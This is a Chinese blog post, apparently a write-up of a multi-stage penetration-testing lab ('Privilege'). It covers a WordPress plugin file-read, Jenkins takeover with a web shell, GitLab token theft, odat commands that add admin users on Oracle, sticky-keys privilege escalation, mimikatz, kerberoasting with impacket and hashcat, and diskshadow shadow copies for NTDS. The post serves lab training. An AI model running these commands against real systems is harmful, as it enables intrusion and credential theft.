@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Privilege - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Privilege - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2026/03/17/Privilege/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2026-03-16T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2026-03-17T00:00:00+08:00">
+      March 17, 2026
+    </time>
+    
+
+    <h1 class="title">Privilege</h1>
+  </div>
+
+  <div class="content">
+    <p>看见是WordPress站点，直接wpscan开扫</p>
+<p>扫出来存在usc-e-shop漏洞，搜出来CVE-2022-4140但没复现成功</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317153810369.png" alt="image-20260317153810274"></p>
+<p>fscan扫一下</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317152800354.png" alt="image-20260317152753276"></p>
+<p>发现源码</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317153057959.png" alt="image-20260317153057892"></p>
+<p>发现数据库账密</p>
+<p>现在知道为什么没复现成功了，这题源码把原本在wp-content&#x2F;plugins&#x2F;usc-e-shop&#x2F;functions目录下的content-log.php移到了tools目录下</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317153956716.png" alt="image-20260317153956667"></p>
+<p>所以原来的cve还是能用的，不过要把路由换成&#x2F;tools&#x2F;content-log.php</p>
+<p>题目提示说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\ProgramData\Jenkins\.jenkins。</span><br></pre></td></tr></table></figure>
+
+<p>Jenkins就是8080端口上的服务，搜索一下密码在哪</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317154210535.png" alt="image-20260317154210502"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317154233917.png" alt="image-20260317154233890"></p>
+<p>成功admin登陆后</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/718857178">Jenkins未授权访问漏洞复现与 getshell 利用方法汇总 - 知乎</a></p>
+<p>如果知道web站点的话是可以写入一句话木马的，刚好我在读密码的时候不小心报错过一次，从而知道了80端口的web站点</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317155533242.png" alt="image-20260317155533207"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317155614660.png" alt="image-20260317155614614"></p>
+<p>成功连接</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317155645696.png" alt="image-20260317155645661"></p>
+<p>第二关的题目提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。</span><br></pre></td></tr></table></figure>
+
+<p>发现hidden了复制不出来</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317160849114.png" alt="image-20260317160849056"></p>
+<p>网页源代码里面看一下</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317160952710.png" alt="image-20260317160952664"></p>
+<p>成功找到,即value的值</p>
+<p>但这是一个加密后的结果</p>
+<p>回到控制台解密一下</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260320132125190.png" alt="image-20260320132125156"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317162204002.png" alt="image-20260317162203971"></p>
+<p>GitLab信息泄露利用详见 </p>
+<p> <a target="_blank" rel="noopener" href="https://gitlab.cn/docs/jh/api/projects.html">项目 API | 极狐GitLab</a></p>
+<p>先fscan扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">172.22.14.31:1521 open</span><br><span class="line">172.22.14.7:445 open</span><br><span class="line">172.22.14.7:3306 open</span><br><span class="line">172.22.14.46:445 open</span><br><span class="line">172.22.14.31:445 open</span><br><span class="line">172.22.14.11:445 open</span><br><span class="line">172.22.14.46:139 open</span><br><span class="line">172.22.14.31:139 open</span><br><span class="line">172.22.14.11:139 open</span><br><span class="line">172.22.14.31:135 open</span><br><span class="line">172.22.14.46:135 open</span><br><span class="line">172.22.14.7:139 open</span><br><span class="line">172.22.14.11:135 open</span><br><span class="line">172.22.14.7:135 open</span><br><span class="line">172.22.14.46:80 open</span><br><span class="line">172.22.14.16:80 open</span><br><span class="line">172.22.14.7:80 open</span><br><span class="line">172.22.14.16:22 open</span><br><span class="line">172.22.14.11:88 open</span><br><span class="line">172.22.14.16:8060 open</span><br><span class="line">172.22.14.7:8080 open</span><br><span class="line">172.22.14.16:9094 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.14.7</span><br><span class="line">   [-&gt;]XR-JENKINS</span><br><span class="line">   [-&gt;]172.22.14.7</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.14.11</span><br><span class="line">   [-&gt;]XR-DC</span><br><span class="line">   [-&gt;]172.22.14.11</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.14.46</span><br><span class="line">   [-&gt;]XR-0923</span><br><span class="line">   [-&gt;]172.22.14.46</span><br><span class="line">[*] NetBios 172.22.14.11    [+] DC:XIAORANG\XR-DC          </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.14.31</span><br><span class="line">   [-&gt;]XR-ORACLE</span><br><span class="line">   [-&gt;]172.22.14.31</span><br><span class="line">[*] WebTitle http://172.22.14.7:8080   code:403 len:548    title:None</span><br><span class="line">[*] NetBios 172.22.14.46    XIAORANG\XR-0923              </span><br><span class="line">[*] NetBios 172.22.14.31    WORKGROUP\XR-ORACLE           </span><br><span class="line">[*] WebTitle http://172.22.14.46       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.14.16:8060  code:404 len:555    title:404 Not Found</span><br><span class="line">[*] WebTitle http://172.22.14.7        code:200 len:54603  title:XR SHOP</span><br><span class="line">[+] PocScan http://172.22.14.7/www.zip poc-yaml-backup-file</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317172032709.png" alt="image-20260317172032659"></p>
+<p>梳理一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.14.7 已拿下</span><br><span class="line">172.22.14.11 XIAORANG\XR-DC</span><br><span class="line">172.22.14.16 gitlab</span><br><span class="line">172.22.14.31 WORKGROUP\XR-ORACLE</span><br><span class="line">172.22.14.46 XIAORANG\XR-0923</span><br></pre></td></tr></table></figure>
+
+<p>添加个管理员rdp一下</p>
+<p>发现桌面上有mysql用之前获取的账密成功登录，但没发现什么有用信息</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317171059233.png" alt="image-20260317171059134"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260320131839833.png" alt="image-20260320131832752"></p>
+<p>梳理一下输出的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/internal-secret.git</span><br><span class="line">&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/xradmin.git&quot;</span><br><span class="line">&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/awenode.git&quot;</span><br><span class="line">&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/xrwiki.git&quot;</span><br><span class="line">&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring.git&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在kali里面git一下</p>
+<p>在xradmin&#x2F;ruoyi-admin&#x2F;src&#x2F;main&#x2F;resources&#x2F;application-druid.yml找到Oracle的账密</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317173213183.png" alt="image-20260317173213105"></p>
+<p>因为是Oracle所以用odat打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#x27;net user bug 123456We /add&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#x27;net localgroup administrator bug /add&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>rdp连上31</p>
+<p>成功拿到flag</p>
+<p>下一关描述</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。</span><br></pre></td></tr></table></figure>
+
+<p>之前git下来的项目的internal-secret&#x2F;credentials.txt里找到XR-0923的账密</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317181925130.png" alt="image-20260317181925078"></p>
+<p>rdp连但是权限低读不了</p>
+<p>想办法提权</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317183111760.png" alt="image-20260317183111723"></p>
+<p>net user zhangshuai发现是Remote ManagerUser，可以打winrm</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317183039476.png" alt="image-20260317183039408"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs</span><br></pre></td></tr></table></figure>
+
+<p>发现比rdp多了一个SeRestorePrivilege，这个特权对任何文件都具有写权限</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317183136759.png" alt="image-20260317183136674"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79518550/article/details/156915085">Windows SeBackupPrivilege 与 SeRestorePrivilege 特权利用-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8">渗透技巧——Windows九种权限的利用</a></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317185005718.png" alt="image-20260317185005657"></p>
+<p>但上面文章里的方法用不了</p>
+<p>粘滞键提权，这两条命令的意思是将sethc.exe重命名为sethc.bak，将cmd.exe重命名为sethc.exe，这样在登录界面连按5次就是调用的名为sethc.exe的cmd.exe文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ren C://windows/system32/sethc.exe C://windows/system32/sethc.bak</span><br><span class="line">ren C://windows/system32/cmd.exe C://windows/system32/sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p>在rdp里面锁定用户，连按5次shift，利用登陆程序的高权限开启终端</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317190529987.png" alt="image-20260317190529908"></p>
+<p>成功获取flag</p>
+<p>第四关提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试接管备份管理操作员帐户，并通过转储 NTDS 获得域管理员权限，最终控制整个域环境。</span><br></pre></td></tr></table></figure>
+
+<p>用刚刚的终端创建一个管理员</p>
+<p>rdp上去用mimikatz收集哈希</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317191521884.png" alt="image-20260317191521832"></p>
+<p>找到了域用户XR-0923的哈希7bf463dd91460b3b151eff73e3998132</p>
+<p>打kerberoasting</p>
+<p>SPN（Service Principle Name）是服务实例的唯一标识符，它告诉kerberos该服务运行在哪台计算机的哪个账户下</p>
+<p>当客户端想访问某个网络服务时，需要向DC申请一张ST，为了请求ST，客户端必须用SPN向DC说明它要访问哪个服务，</p>
+<p>大多数SPN关联的是计算机账户，但如果域管配置了服务以普通域用户身份运行，那此服务的SPN关联的就是域用户</p>
+<p>为什么GetUserSPNs要找关联用户的spn?</p>
+<p>找到了用户关联的spn就能向dc申请ST，而ST是由关联用户的密码哈希加密的，拿到了ST就有爆破的可能</p>
+<p>因为计算机用户密码通常非常长，不可能爆破。但是普通用户密码一般就几位，容易爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs xiaorang.lab/&#x27;XR-0923$&#x27; -hashes &#x27;:a5ac13ae0abc9935a13e81c88f638494&#x27; -dc-ip 172.22.14.11</span><br></pre></td></tr></table></figure>
+
+<p>之前的Flarum靶场也用到了kerberoasting,但是那次有用户名字典，但没有域用户的ntml哈希，这次相反，没有用户字典但是有哈希，这两次有啥区别吗？</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317192223012.png" alt="image-20260317192222960"></p>
+<p>抓tianjing的哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs xiaorang.lab/&#x27;XR-0923$&#x27; -hashes &#x27;:a5ac13ae0abc9935a13e81c88f638494&#x27; -dc-ip 172.22.14.11 -request-user tianjing</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317192448448.png" alt="image-20260317192448367"></p>
+<p>保存下来用hashcat爆破一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 hash.txt all.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317193027403.png" alt="image-20260317193027300"></p>
+<p>成功爆破出来DPQSXSXgh2</p>
+<p>winrm连一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317193312741.png" alt="image-20260317193312681"></p>
+<p>多了一个SeBackupPrivilege</p>
+<p>在kali上新建一个raj.dsh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias raj</span><br><span class="line">create</span><br><span class="line">expose %raj% z:</span><br></pre></td></tr></table></figure>
+
+<p>再用unix2dos转换一下编码</p>
+<p>上传一下</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317194601583.png" alt="image-20260317194601544"></p>
+<p>卷影拷贝</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317194703570.png" alt="image-20260317194703498"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317195311695.png" alt="image-20260317195311596"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260317195427020.png" alt="image-20260317195426949"></p>
+<p>我急着吃饭就只读了flag，wp里面是读取域管哈希，明天看看</p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2026/03/18/hospital/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">Hospital</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2026/03/16/Delegation/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">Delegation</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
